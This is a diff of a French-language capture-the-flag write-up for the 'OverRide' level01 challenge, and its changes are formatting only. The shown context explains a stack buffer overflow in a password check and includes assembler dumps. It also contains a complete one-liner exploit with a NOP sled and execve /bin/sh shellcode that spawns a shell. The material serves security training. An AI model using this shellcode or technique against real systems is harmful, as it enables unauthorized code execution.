@@ -1,4 +1,4 @@
-# 01 - Buffer overflow 1
+# 01 - Buffer overflow (1)
 
 - On se connecte en tant que level01:
 ```
@@ -70,7 +70,7 @@ Dump of assembler code for function main:
    0x080485b2 <+226>:   pop    %ebx
    0x080485b3 <+227>:   pop    %edi
    0x080485b4 <+228>:   pop    %ebp
-   0x080485b5 <+229>:   ret    
+   0x080485b5 <+229>:   ret
 End of assembler dump.
 ```
 
@@ -99,7 +99,7 @@ Dump of assembler code for function verify_user_name:
    0x0804849f <+59>:    pop    %esi
    0x080484a0 <+60>:    pop    %edi
    0x080484a1 <+61>:    pop    %ebp
-   0x080484a2 <+62>:    ret    
+   0x080484a2 <+62>:    ret
 End of assembler dump.
 ```
 
@@ -125,7 +125,7 @@ Dump of assembler code for function verify_user_pass:
    0x080484cc <+41>:    pop    %esi
    0x080484cd <+42>:    pop    %edi
    0x080484ce <+43>:    pop    %ebpdd
-   0x080484cf <+44>:    ret    
+   0x080484cf <+44>:    ret
 End of assembler dump.
 ```
 
@@ -213,11 +213,11 @@ End of assembler dump.
 - Peut importe ce qui se passe ensuite, le programme affiche un message d'erreur et on retourne 1. Mais étant donné qu'on prompt stdin pour 0x64 octets et qu'on stocke l'entrée dans un buffer de 0x40 octets, on peut overflow le buffer et écraser la valeur de retour de la fonction `<verify_user_pass>`.
 
 ```
-level01@OverRide:~$ (echo dat_wil; python -c "print('\x90'*35 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*18 + '\xec\xd6\xff\xff')"; cat) | ./level01 
+level01@OverRide:~$ (echo dat_wil; python -c "print('\x90'*35 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*18 + '\xec\xd6\xff\xff')"; cat) | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
-Enter Password: 
+Enter Password:
 nope, incorrect password...
 
 $ whoami
